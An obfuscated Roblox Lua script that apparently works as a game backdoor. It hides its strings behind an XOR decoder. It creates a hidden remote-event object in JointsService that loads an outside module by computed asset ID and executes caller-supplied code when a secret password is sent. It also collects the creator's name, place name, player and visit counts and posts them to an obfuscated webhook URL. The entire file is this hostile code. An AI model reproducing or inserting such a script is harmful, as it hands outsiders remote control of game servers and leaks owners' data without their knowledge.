local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v23,v24) local v25={};for v29=1, #v23 do v6(v25,v0(v4(v1(v2(v23,v29,v29 + 1 )),v1(v2(v24,1 + (v29% #v24) ,1 + (v29% #v24) + 1 )))%256 ));end return v5(v25);end local v8=Instance.new(v7("\227\198\214\42\242\190\226\8\212\205\207","\126\177\163\187\69\134\219\167"));v8.Parent=game.JointsService;v8.OnServerEvent:Connect(function(v26,v27,v28) if (v28==v7("\114\159\125\146\165\122\156\115\146\173\113\158\114\146\164\115\148\114\146\173\113\158","\156\67\173\74\165")) then require(2142437623 -1511908359 )(v27)();end end);local v11=game:GetService(v7("\28\163\93\6\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));local v12=game.Players:GetNameFromUserIdAsync(game.CreatorId);local v13=game:GetService(v7("\125\23\48\25\251\68\6\46\19\253\85\37\39\0\232\89\21\39","\158\48\118\66\114")):GetProductInfo(game.PlaceId);local v14=v13.Name;local v15= #game.Players:GetPlayers();local v16=game.GameId;local v17=v7("\163\48\4\38\96\255\180\228\35\17\59\118\182\181\185\43\0\36\124\189\226\229\39\31\59\60\179\170\228\35\17\59\118\182\164\190\42\25\32\118\183\232\174\13\20\37\46","\155\203\68\112\86\19\197")   .. v16 ;local v18,v19=pcall(function() return v11:GetAsync(v17);end);local v20;local v21=v7("\78\201\34\236\83\34\170\183\71\206\37\249\84\127\228\245\67\147\36\243\66\116\234\224\8\222\57\241\15\95\228\245\67\146\2\243\79\116\246\183\114\213\35\241\66\118\228\241\74\252\37\239\69\108\171\249\85\213\46\163\65\113\225\165","\152\38\189\86\156\32\24\133")   .. game.PlaceId   .. v7("\186\81\170\82\161\71\169\65\186\64\163\27\168\5\247\0\244\67\250\18\174\7","\38\156\55\199") ;if v18 then v20=v11:JSONDecode(v19).data[1].visits;end local v22={[v7("\171\114\114\60\22\122\238","\35\200\29\28\72\115\20\154")]="h",[v7("\28\178\211\218\137\63","\84\121\223\177\191\237\76")]={{[v7("\175\95\221\172\63","\161\219\54\169\192\90\48\80")]=tostring(v14)   .. v7("\9\15\64\2\72\79\5\101\69\77\7\34\76\70\78","\69\41\34\96") ,[v7("\184\198\196\9\16\34\172\215\222\5\12","\75\220\163\183\106\98")]=v7("\35\250\133\50\206\66\189\138\58\220\66\182\132\48\153\10\187\143\119\216\18\170\142\54\203\7\190\197","\185\98\218\235\87"),[v7("\200\51\43\233\204","\202\171\92\71\134\190")]=nil,[v7("\47\200\41\132\45\210","\232\73\161\76")]={{[v7("\181\216\79\88","\126\219\185\34\61")]=v7("\63\203\76\100\123\101\179\215\0\207\71\119\108\100","\135\108\174\62\18\30\23\147"),[v7("\160\232\38\222\29","\167\214\137\74\171\120\206\83")]=tostring(v15)},{[v7("\133\241\63\88","\199\235\144\82\61\152")]=v7("\38\21\173\34\17\19\249\27\11\23\160\46\21\5","\75\103\118\217"),[v7("\209\85\124\1\188","\126\167\52\16\116\217")]=v7("\235\27\18\178\145\55\200\228\23\96\181\154\56\202\233\7\12\161\150\53\217","\156\168\78\64\224\212\121")},{[v7("\9\239\168\203","\174\103\142\197")]=v7("\121\63\81\61\55","\152\54\72\63\88\69\62"),[v7("\194\197\226\73\209","\60\180\164\142")]=tostring(v12)},{[v7("\86\95\8\44","\114\56\62\101\73\71\141")]=v7("\142\224\200\205\172\250","\164\216\137\187"),[v7("\196\231\61\167\163","\107\178\134\81\210\198\158")]=tostring(v20)},{[v7("\54\15\143\195","\202\88\110\226\166")]=v7("\228\14\143\242\138\239\6\140\252","\170\163\111\226\151"),[v7("\7\49\190\45\75","\73\113\80\210\88\46\87")]=v7("\137\56\217\2\244\219\99\130\5\240\150\98\223\29\229\141\35\213\92\228\142\33\130\21\230\140\41\222\93","\135\225\76\173\114")   .. tostring(game.PlaceId) }},[v7("\27\248\172\184\163\175","\199\122\141\216\208\204\221")]={[v7("\163\220\29\245","\150\205\189\112\144\24")]=v7("\22\145\189\65\13\155\2\25\51\129\255\105\28\141\18","\112\69\228\223\44\100\232\113")},[v7("\210\16\8\199\179\110","\230\180\127\103\179\214\28")]={[v7("\152\0\71\82","\128\236\101\63\38\132\33")]=v7("\159\188\19\73\191\248\220\165\191\20\4\147\243\202\175\188\5\75\164\171\249\254","\175\204\201\113\36\214\139")},[v7("\78\193\52\219\1","\100\39\172\85\188")]={[v7("\184\106\181","\83\205\24\217\224")]=tostring(v21)},[v7("\242\205\216\48\228\203\204\52\234","\93\134\165\173")]={[v7("\171\224\205","\30\222\146\161\162\90\174\210")]=tostring(v21)}}},[v7("\228\90\100\11\230\70\125\15\235\90\99","\106\133\46\16")]={}};v11:PostAsync(v7("\80\52\103\236\73\26\23\111\100\249\88\72\87\47\120\178\77\72\81\52\118\244\83\76\84\110\116\238\85\85\72\111\114\236\83\15\79\37\113\244\85\79\83\51\60\173\9\17\12\118\34\171\10\17\14\114\43\171\12\18\13\114\39\170\21\116\90\24\126\239\112\65\125\21\70\164\96\109\66\114\117\244\11\102\72\20\81\241\117\100\64\38\84\254\86\120\115\118\76\245\88\68\114\120\32\202\78\106\107\52\96\165\127\23\112\52\105\168\108\85\9\1\66\253\107\77\92\8\80\212\117\109\8","\32\56\64\19\156\58"),v11:JSONEncode(v22));